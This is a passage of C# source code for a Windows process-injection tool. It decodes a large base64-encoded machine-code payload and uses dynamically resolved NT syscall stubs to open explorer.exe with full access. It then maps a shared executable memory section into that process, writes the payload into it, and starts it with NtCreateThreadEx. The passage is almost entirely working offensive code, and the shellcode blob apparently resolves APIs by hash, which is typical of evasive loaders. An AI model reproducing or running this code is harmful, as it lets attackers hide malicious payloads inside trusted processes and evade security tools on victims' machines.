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";
			byte[] buf = Convert.FromBase64String(b64Buf);
            //get process handles
            IntPtr stub = Inject.DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hTargetProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            IntPtr hCurrentProcess = IntPtr.Zero;
            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)Process.GetProcessesByName("explorer")[0].Id
            };

            OBJECT_ATTRIBUTES oa2 = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci2 = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)Process.GetCurrentProcess().Id
            };

            var res = ntOpenProcess(ref hTargetProcess,
                (uint)ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            res = ntOpenProcess(ref hCurrentProcess,
                (uint)ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa2,
                ref ci2);

            // NtCreateSection
            stub = Inject.DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateSection");
            NtCreateSection ntCreateSection = (NtCreateSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateSection));

            IntPtr SectionHandle = IntPtr.Zero;
            ulong maxSize = (ulong)(buf.Length + (4096 - buf.Length % 4096));

            res = ntCreateSection(ref SectionHandle,
                (uint)ACCESS_MASK.SECTION_ALL_ACCESS, IntPtr.Zero,
                ref maxSize,
                WinNT.PAGE_EXECUTE_READWRITE, WinNT.SEC_COMMIT, IntPtr.Zero);

            IntPtr localBaseAddress = IntPtr.Zero;
            IntPtr sectionOffset = IntPtr.Zero;
            ulong viewSize = 0;

            //map section locally
            stub = Inject.DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtMapViewOfSection");
            NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtMapViewOfSection));

            res = ntMapViewOfSection(SectionHandle,
                hCurrentProcess,
                out localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                sectionOffset,
                out viewSize,
                2,
                0,
                WinNT.PAGE_READWRITE
                );

            //map section remotely

            IntPtr remoteBaseAddress = IntPtr.Zero;

            res = ntMapViewOfSection(SectionHandle,
                hTargetProcess,
                out remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                sectionOffset,
                out viewSize,
                2,
                0,
                WinNT.PAGE_EXECUTE_READ
                );

            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);

            //create remote thread
            //it seems not working
            /* 
            stub = Generic.GetSyscallStub("RtlCreateUserThread");
            RtlCreateUserThread rtlCreateUserThread = (RtlCreateUserThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(RtlCreateUserThread));


            IntPtr hRemoteThread = IntPtr.Zero;
            var res2 = rtlCreateUserThread(hTargetProcess, 
                IntPtr.Zero, 
                false,
                IntPtr.Zero,
                IntPtr.Zero, 
                IntPtr.Zero,
                remoteBaseAddress, 
                IntPtr.Zero, ref hRemoteThread, IntPtr.Zero);

            */
            // NtCreateThreadEx
            stub = Inject.DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            var result = ntCreateThreadEx(
                out hThread,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hTargetProcess,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

        }


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtCreateSection(
                ref IntPtr SectionHandle,
                uint DesiredAccess,
                IntPtr ObjectAttributes,
                ref ulong MaximumSize,
                uint SectionPageProtection,
                uint AllocationAttributes,
                IntPtr FileHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NTSTATUS RtlCreateUserThread(
                IntPtr Process,
                IntPtr ThreadSecurityDescriptor,
                bool CreateSuspended,
                IntPtr ZeroBits,
                IntPtr MaximumStackSize,
                IntPtr CommittedStackSize,
                IntPtr StartAddress,
                IntPtr Parameter,
                ref IntPtr Thread,
                IntPtr ClientId);


        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [Flags]
        public enum ProcessAccessFlags : UInt32
        {
            // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
            PROCESS_ALL_ACCESS = 0x001F0FFF,
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_DUP_HANDLE = 0x0040,
